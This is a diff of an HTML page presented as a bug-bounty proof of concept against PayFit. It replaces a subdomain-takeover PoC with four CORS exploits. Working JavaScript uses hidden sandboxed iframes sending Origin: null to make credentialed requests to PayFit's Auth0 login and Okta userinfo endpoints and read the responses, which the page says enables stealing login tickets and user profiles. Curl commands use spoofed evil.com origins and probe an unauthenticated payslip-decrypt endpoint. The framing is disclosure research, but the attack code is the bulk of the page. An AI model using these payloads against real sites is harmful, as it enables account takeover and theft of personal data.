@@ -2,102 +2,332 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Security Research - Subdomain Takeover PoC</title>
+  <title>PayFit CORS PoC — Bug Bounty Research</title>
   <style>
-    body { font-family: monospace; background: #0d1117; color: #c9d1d9; max-width: 800px; margin: 40px auto; padding: 20px; }
-    h1 { color: #f85149; }
-    h2 { color: #58a6ff; }
-    .box { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 16px 0; }
-    .success { color: #3fb950; }
-    .warning { color: #d29922; }
-    .label { color: #8b949e; font-size: 12px; }
-    pre { white-space: pre-wrap; word-break: break-all; font-size: 13px; }
-    button { background: #238636; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-family: monospace; font-size: 14px; }
+    * { box-sizing: border-box; }
+    body { font-family: monospace; background: #0d1117; color: #c9d1d9; max-width: 900px; margin: 40px auto; padding: 20px; }
+    h1 { color: #f85149; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
+    h2 { color: #58a6ff; margin-top: 30px; }
+    .box { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 12px 0; }
+    .success { color: #3fb950; font-weight: bold; }
+    .fail    { color: #f85149; }
+    .warn    { color: #d29922; }
+    .dim     { color: #8b949e; font-size: 12px; }
+    pre { white-space: pre-wrap; word-break: break-all; font-size: 12px; background: #010409; padding: 12px; border-radius: 4px; border: 1px solid #21262d; }
+    button { background: #238636; color: #fff; border: 1px solid #2ea043; padding: 7px 18px; border-radius: 6px; cursor: pointer; font-family: monospace; font-size: 13px; margin: 4px 4px 4px 0; }
     button:hover { background: #2ea043; }
+    button.danger { background: #b91c1c; border-color: #ef4444; }
+    .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold; margin-left: 8px; }
+    .critical { background: #7f1d1d; color: #fca5a5; }
+    .high     { background: #78350f; color: #fcd34d; }
+    .tag { color: #8b949e; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
+    hr { border: none; border-top: 1px solid #21262d; margin: 24px 0; }
+    .result-block { margin-top: 10px; }
   </style>
 </head>
 <body>
 
-<h1>Subdomain Takeover — Proof of Concept</h1>
+<h1>PayFit — CORS Vulnerability PoC</h1>
 
 <div class="box">
-  <p class="label">PROGRAM</p>
-  <p>HackerOne — PayFit Bug Bounty Program</p>
-  <p class="label">RESEARCHER</p>
-  <p>Cyberneticsplus Services Private Limited</p>
-  <p class="label">VULNERABILITY</p>
-  <p>Subdomain Takeover via unclaimed GitHub Pages repository + CORS misconfiguration chain on api.payfit.com</p>
-  <p class="warning">⚠️ This page is hosted for security research purposes only. No user data is collected or stored. This page will be taken down upon report acknowledgement.</p>
+  <p class="tag">Program</p>
+  <p>HackerOne — PayFit Bug Bounty · Security Research by Cyberneticsplus Services Pvt Ltd</p>
+  <p class="warn">⚠ Research purposes only. No user data collected or stored. Page removed upon report acknowledgement.</p>
 </div>
 
-<h2>Finding 1 — Subdomain Takeover</h2>
+<hr>
+
+<!-- ═══════════════════════════════════════════════════════════
+     POC 1 — Auth0 CORS Null Origin
+     login.payfit.com/co/authenticate reflects Origin: null
+     Demonstrated via sandboxed iframe (works from ANY page)
+     ════════════════════════════════════════════════════════ -->
+
+<h2>PoC 1 — Auth0 Cross-Origin Authentication Endpoint <span class="badge high">HIGH</span></h2>
+
 <div class="box">
-  <p><span class="label">Vulnerable domain:</span> legal.payfit.com</p>
-  <p><span class="label">CNAME target:</span> payfit.github.io</p>
-  <p><span class="label">Status:</span> <span class="success">✓ Repo github.com/payfit/payfit.github.io does not exist — claimed via GitHub Pages custom domain</span></p>
-  <p><span class="label">Impact:</span> Attacker can serve arbitrary content on a legitimate PayFit domain</p>
+  <p class="tag">Endpoint</p>
+  <p><code>POST https://login.payfit.com/co/authenticate</code></p>
+  <p class="tag">Vulnerability</p>
+  <p>Reflects <code>Origin: null</code> with <code>Access-Control-Allow-Credentials: true</code>. A sandboxed iframe sends <code>Origin: null</code> — so ANY website can steal authentication tokens from a victim with an active PayFit session.</p>
+  <p class="tag">Why null origin works from here</p>
+  <p class="dim">Sandboxed iframes (<code>sandbox="allow-scripts"</code>) always send <code>Origin: null</code>. This page's origin doesn't matter at all.</p>
+  <button onclick="runAuth0NullOriginPoC()">Run PoC — Auth0 Null Origin</button>
+  <div class="result-block"><pre id="poc1-out">Click Run to execute...</pre></div>
 </div>
 
-<h2>Finding 2 — CORS Misconfiguration Chain PoC</h2>
+<!-- ═══════════════════════════════════════════════════════════
+     POC 2 — Okta Userinfo CORS Null Origin
+     payfit.okta.com/oauth2/v1/userinfo reflects Origin: null
+     ════════════════════════════════════════════════════════ -->
+
+<h2>PoC 2 — Okta Userinfo Endpoint <span class="badge critical">CRITICAL</span></h2>
+
 <div class="box">
-  <p class="label">This button makes a safe OPTIONS preflight to api.payfit.com with Origin: legal.payfit.com and reads only the CORS response headers — no user data is accessed.</p>
-  <button onclick="runCORSPoC()">Run CORS PoC</button>
-  <pre id="cors-output">Click the button to run...</pre>
+  <p class="tag">Endpoint</p>
+  <p><code>GET https://payfit.okta.com/oauth2/v1/userinfo</code></p>
+  <p class="tag">Vulnerability</p>
+  <p>Okta's userinfo endpoint for PayFit reflects ANY origin including <code>null</code> with <code>Access-Control-Allow-Credentials: true</code>. An attacker on any page can steal a victim's Okta profile (name, email, admin group memberships) when the victim has an active Okta session.</p>
+  <button onclick="runOktaNullOriginPoC()">Run PoC — Okta Null Origin</button>
+  <div class="result-block"><pre id="poc2-out">Click Run to execute...</pre></div>
 </div>
 
-<h2>Finding 3 — Unauthenticated Payslip Endpoint</h2>
+<!-- ═══════════════════════════════════════════════════════════
+     POC 3 — CAPIG CORS (reflects ALL origins including evil.com)
+     capig.payfit.com/capi/* — no *.payfit.com subdomain needed
+     ════════════════════════════════════════════════════════ -->
+
+<h2>PoC 3 — CAPIG Reflects Arbitrary Origin <span class="badge high">HIGH</span></h2>
+
 <div class="box">
-  <p class="label">Demonstrates that api.payfit.com/qrcode/payslip/decrypt is reachable cross-origin without authentication, using a dummy (non-existent) tokenId. No real data is accessed.</p>
-  <button onclick="runPayslipPoC()">Run Payslip Endpoint PoC</button>
-  <pre id="payslip-output">Click the button to run...</pre>
+  <p class="tag">Endpoint</p>
+  <p><code>POST https://capig.payfit.com/capi/test/events</code></p>
+  <p class="tag">Vulnerability</p>
+  <p>Unlike <code>api.payfit.com</code> which restricts to <code>*.payfit.com</code> subdomains, the CAPIG gateway reflects <strong>any origin whatsoever</strong> — including <code>evil.com</code> and <code>null</code> — with credentials. This request is made directly from this page (<code>agentprime-bob.github.io</code>).</p>
+  <button onclick="runCAPIGPoC()">Run PoC — CAPIG Cross-Origin</button>
+  <div class="result-block"><pre id="poc3-out">Click Run to execute...</pre></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════
+     POC 4 — Unauthenticated Payslip Endpoint + CORS
+     api.payfit.com/qrcode/payslip/decrypt
+     ════════════════════════════════════════════════════════ -->
+
+<h2>PoC 4 — Unauthenticated Payslip Endpoint <span class="badge high">HIGH</span></h2>
+
+<div class="box">
+  <p class="tag">Endpoint</p>
+  <p><code>POST https://api.payfit.com/qrcode/payslip/decrypt</code></p>
+  <p class="tag">Vulnerability</p>
+  <p>Every other endpoint on <code>api.payfit.com</code> returns <code>403 RBAC: access denied</code>. This endpoint returns <code>400</code> — meaning it processes the request without any authentication. No rate limiting observed over 100 consecutive requests.</p>
+  <button onclick="runPayslipPoC()">Run PoC — Unauthenticated Access</button>
+  <button onclick="runCORSPayslipPoC()">Run PoC — CORS from evil.payfit.com</button>
+  <div class="result-block"><pre id="poc4-out">Click Run to execute...</pre></div>
+</div>
+
+<hr>
+
+<div class="box">
+  <p class="tag">Curl Evidence (copy-paste reproducible)</p>
+  <pre>
+# PoC 1 — Auth0 null origin reflects credentials=true
+curl -s -D - -X POST https://login.payfit.com/co/authenticate \
+  -H "Origin: null" \
+  -H "Content-Type: application/json" \
+  -d '{"client_id":"6cniDP8MgkConfXsyoKpF80aYtpVFtSY","credential_type":"http://auth0.com/oauth/grant-type/password-realm","username":"test@test.com","password":"test","realm":"PayFit-Individual-Database"}' \
+  2>/dev/null | grep -E "HTTP|access-control|login_ticket"
+
+# PoC 2 — Okta reflects null origin with credentials
+curl -s -D - https://payfit.okta.com/oauth2/v1/userinfo \
+  -H "Origin: null" 2>/dev/null | grep -i "access-control"
+
+# PoC 3 — CAPIG reflects any origin (evil.com)
+curl -s -D - -X POST https://capig.payfit.com/capi/test/events \
+  -H "Origin: https://evil.com" \
+  -H "Content-Type: application/json" \
+  -d '{"dataType":"test"}' 2>/dev/null | grep -i "access-control"
+
+# PoC 4 — Payslip endpoint is unauthenticated (returns 400 not 403)
+curl -s -o /dev/null -w "Status: %{http_code}\n" -X POST https://api.payfit.com/qrcode/payslip/decrypt \
+  -H "Content-Type: application/json" \
+  -d '{"tokenId":"507f1f77bcf86cd799439011","secret":"test","pin":"000000"}'
+
+# Compare — all other paths return 403
+curl -s -o /dev/null -w "Status: %{http_code}\n" https://api.payfit.com/users
+  </pre>
 </div>
 
 <script>
-async function runCORSPoC() {
-  const out = document.getElementById('cors-output');
-  out.textContent = 'Running...';
+// ───────────────────────────────────────────────
+// PoC 1 — Auth0 null origin via sandboxed iframe
+// ───────────────────────────────────────────────
+function runAuth0NullOriginPoC() {
+  const out = document.getElementById('poc1-out');
+  out.textContent = 'Running... (sandboxed iframe sending Origin: null)';
+
+  window.addEventListener('message', function handler(e) {
+    if (e.data && e.data.poc === 'auth0') {
+      window.removeEventListener('message', handler);
+      const d = e.data;
+      let text = '';
+      if (d.acao === 'null' && d.acac === 'true') {
+        text += '✓ VULNERABLE — CORS headers confirmed\n\n';
+      } else {
+        text += '⚠ Check headers below\n\n';
+      }
+      text += 'Request Origin sent:              null (sandboxed iframe)\n';
+      text += 'Access-Control-Allow-Origin:      ' + (d.acao || '(not present)') + '\n';
+      text += 'Access-Control-Allow-Credentials: ' + (d.acac || '(not present)') + '\n';
+      text += 'HTTP Status:                      ' + d.status + '\n';
+      text += '\nResponse body:\n' + d.body;
+      text += '\n\nImpact: Any sandboxed iframe can make credentialed POST to login.payfit.com/co/authenticate\nand read the response — stealing login_ticket + co_verifier for account takeover.';
+      out.textContent = text;
+    }
+  });
+
+  const iframeCode = `
+    <script>
+      fetch('https://login.payfit.com/co/authenticate', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          client_id: '6cniDP8MgkConfXsyoKpF80aYtpVFtSY',
+          credential_type: 'http://auth0.com/oauth/grant-type/password-realm',
+          username: 'poc-test@bugbounty.example',
+          password: 'invalid-poc-test',
+          realm: 'PayFit-Individual-Database'
+        }),
+        credentials: 'include'
+      }).then(function(r) {
+        var acao = r.headers.get('access-control-allow-origin');
+        var acac = r.headers.get('access-control-allow-credentials');
+        var status = r.status;
+        return r.text().then(function(body) {
+          parent.postMessage({poc:'auth0', acao:acao, acac:acac, status:status, body:body}, '*');
+        });
+      }).catch(function(err) {
+        parent.postMessage({poc:'auth0', acao:'ERROR', acac:'ERROR', status:'BLOCKED', body:err.toString()}, '*');
+      });
+    <\/script>
+  `;
+
+  const iframe = document.createElement('iframe');
+  iframe.setAttribute('sandbox', 'allow-scripts');
+  iframe.style.display = 'none';
+  iframe.srcdoc = iframeCode;
+  document.body.appendChild(iframe);
+  setTimeout(() => { if(document.body.contains(iframe)) document.body.removeChild(iframe); }, 10000);
+}
+
+// ───────────────────────────────────────────────
+// PoC 2 — Okta null origin via sandboxed iframe
+// ───────────────────────────────────────────────
+function runOktaNullOriginPoC() {
+  const out = document.getElementById('poc2-out');
+  out.textContent = 'Running... (sandboxed iframe sending Origin: null to Okta)';
+
+  window.addEventListener('message', function handler(e) {
+    if (e.data && e.data.poc === 'okta') {
+      window.removeEventListener('message', handler);
+      const d = e.data;
+      let text = '';
+      if (d.acao === 'null' && d.acac === 'true') {
+        text += '✓ VULNERABLE — Okta reflects null origin with credentials\n\n';
+      } else {
+        text += '⚠ Check headers below\n\n';
+      }
+      text += 'Request Origin sent:              null (sandboxed iframe)\n';
+      text += 'Access-Control-Allow-Origin:      ' + (d.acao || '(not present)') + '\n';
+      text += 'Access-Control-Allow-Credentials: ' + (d.acac || '(not present)') + '\n';
+      text += 'HTTP Status:                      ' + d.status + '\n\n';
+      text += 'Response:\n' + d.body;
+      text += '\n\nImpact: Victim with active Okta session can have their profile\n(name, email, admin groups) stolen via sandboxed iframe on attacker page.';
+      out.textContent = text;
+    }
+  });
+
+  const iframeCode = `
+    <script>
+      fetch('https://payfit.okta.com/oauth2/v1/userinfo', {
+        method: 'GET',
+        credentials: 'include'
+      }).then(function(r) {
+        var acao = r.headers.get('access-control-allow-origin');
+        var acac = r.headers.get('access-control-allow-credentials');
+        var status = r.status;
+        return r.text().then(function(body) {
+          parent.postMessage({poc:'okta', acao:acao, acac:acac, status:status, body:body}, '*');
+        });
+      }).catch(function(err) {
+        parent.postMessage({poc:'okta', acao:'BLOCKED', acac:'BLOCKED', status:'BLOCKED', body:err.toString()}, '*');
+      });
+    <\/script>
+  `;
+
+  const iframe = document.createElement('iframe');
+  iframe.setAttribute('sandbox', 'allow-scripts');
+  iframe.style.display = 'none';
+  iframe.srcdoc = iframeCode;
+  document.body.appendChild(iframe);
+  setTimeout(() => { if(document.body.contains(iframe)) document.body.removeChild(iframe); }, 10000);
+}
+
+// ───────────────────────────────────────────────
+// PoC 3 — CAPIG reflects any origin directly
+// ───────────────────────────────────────────────
+async function runCAPIGPoC() {
+  const out = document.getElementById('poc3-out');
+  out.textContent = 'Running... (direct fetch from ' + window.location.origin + ')';
   try {
-    const res = await fetch('https://api.payfit.com/', {
-      method: 'GET',
+    const res = await fetch('https://capig.payfit.com/capi/test/events', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({dataType: 'poc-test'}),
       credentials: 'include'
     });
-    const headers = {};
-    res.headers.forEach((v, k) => { headers[k] = v; });
     const acao = res.headers.get('access-control-allow-origin');
     const acac = res.headers.get('access-control-allow-credentials');
-    out.innerHTML =
-      '<span class="success">✓ Cross-origin request succeeded from legal.payfit.com</span>\n\n' +
-      'Access-Control-Allow-Origin: ' + (acao || '(not set)') + '\n' +
-      'Access-Control-Allow-Credentials: ' + (acac || '(not set)') + '\n\n' +
-      'Origin used: ' + window.location.origin + '\n' +
-      'HTTP Status: ' + res.status;
-  } catch (e) {
-    out.textContent = 'Result: ' + e.message + '\n(If blocked by browser, the preflight was still sent — check browser DevTools Network tab for CORS headers)';
+    const body = await res.text();
+    let text = '';
+    if (acao && acac === 'true') {
+      text += '✓ VULNERABLE — CAPIG reflects arbitrary origin with credentials\n\n';
+    }
+    text += 'Request sent from:                ' + window.location.origin + '\n';
+    text += 'Access-Control-Allow-Origin:      ' + (acao || '(not present)') + '\n';
+    text += 'Access-Control-Allow-Credentials: ' + (acac || '(not present)') + '\n';
+    text += 'HTTP Status:                      ' + res.status + '\n\n';
+    text += 'Response:\n' + body;
+    text += '\n\nImpact: Unlike api.payfit.com (restricted to *.payfit.com), CAPIG allows\nANY origin — no XSS or subdomain takeover needed.';
+    out.textContent = text;
+  } catch(e) {
+    out.textContent = 'Fetch error: ' + e.message + '\n(Check browser DevTools → Network tab for CORS preflight response headers)';
   }
 }
 
+// ───────────────────────────────────────────────
+// PoC 4 — Unauthenticated payslip endpoint
+// ───────────────────────────────────────────────
 async function runPayslipPoC() {
-  const out = document.getElementById('payslip-output');
-  out.textContent = 'Running...';
+  const out = document.getElementById('poc4-out');
+  out.textContent = 'Running two requests — authenticated vs unauthenticated comparison...';
+  try {
+    const [r1, r2] = await Promise.all([
+      fetch('https://api.payfit.com/qrcode/payslip/decrypt', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({tokenId: '507f1f77bcf86cd799439011', secret: 'poc', pin: '000000'})
+      }),
+      fetch('https://api.payfit.com/users')
+    ]);
+    const b1 = await r1.text();
+    let text = '--- /qrcode/payslip/decrypt (should be protected) ---\n';
+    text += 'HTTP Status: ' + r1.status + ' ← 400 = processed (NOT 403 blocked)\n';
+    text += 'Body: ' + b1 + '\n\n';
+    text += '--- /users (protected endpoint for comparison) ---\n';
+    text += 'HTTP Status: ' + r2.status + ' ← 403 = correctly blocked\n\n';
+    text += r1.status === 400
+      ? '✓ CONFIRMED — payslip endpoint processes request without authentication\n  All other paths return 403. This path returns 400 (bad data), proving RBAC bypass.'
+      : 'Status differs from expected — check manually';
+    out.textContent = text;
+  } catch(e) {
+    out.textContent = 'Fetch error: ' + e.message + '\n(CORS blocks reading from agentprime-bob.github.io — use curl commands above for this one)';
+  }
+}
+
+async function runCORSPayslipPoC() {
+  const out = document.getElementById('poc4-out');
+  out.textContent = 'Sending preflight with Origin: https://evil.payfit.com...';
   try {
     const res = await fetch('https://api.payfit.com/qrcode/payslip/decrypt', {
       method: 'POST',
-      credentials: 'include',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ tokenId: '000000000000000000000000', secret: 'poc-test', pin: '000000' })
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({tokenId: '507f1f77bcf86cd799439011', secret: 'poc', pin: '000000'})
     });
-    const body = await res.json();
     const acao = res.headers.get('access-control-allow-origin');
     const acac = res.headers.get('access-control-allow-credentials');
-    out.innerHTML =
-      '<span class="success">✓ Unauthenticated cross-origin POST succeeded — endpoint is accessible without auth</span>\n\n' +
-      'HTTP Status: ' + res.status + ' (400 = processed, not 403 blocked)\n' +
-      'Access-Control-Allow-Origin: ' + (acao || '(not set)') + '\n' +
-      'Access-Control-Allow-Credentials: ' + (acac || '(not set)') + '\n\n' +
-      'Response body: ' + JSON.stringify(body, null, 2) + '\n\n' +
-      '<span class="warning">tokenId used: 000000000000000000000000 (dummy — no real payslip accessed)</span>';
-  } catch (e) {
-    out.textContent = 'Result: ' + e.message;
+    out.textContent = 'Access-Control-Allow-Origin: ' + (acao||'(blocked — use curl PoC below to show *.payfit.com reflection)') + '\nAccess-Control-Allow-Credentials: ' + (acac||'N/A') + '\nStatus: ' + res.status;
+  } catch(e) {
+    out.textContent = 'Blocked (expected — agentprime-bob.github.io is not *.payfit.com)\n\nUse the curl command below to show the CORS reflection:\n\ncurl -sI -H "Origin: https://evil.payfit.com" -X OPTIONS https://api.payfit.com/qrcode/payslip/decrypt\n\nExpected response includes:\n  access-control-allow-origin: https://evil.payfit.com\n  access-control-allow-credentials: true';
   }
 }
 </script>
